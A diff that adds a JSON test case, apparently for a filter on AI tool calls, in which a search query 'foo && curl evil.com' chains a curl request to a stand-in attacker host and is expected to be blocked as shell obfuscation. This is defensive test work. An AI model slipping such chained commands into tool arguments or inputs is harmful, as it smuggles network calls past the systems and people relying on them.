@@ -1,0 +1,9 @@
+{
+  "toolName": "search",
+  "arguments": {
+    "query": "foo && curl evil.com"
+  },
+  "expected": "block",
+  "category": "shell-obfuscation",
+  "ruleHint": "logical-and"
+}
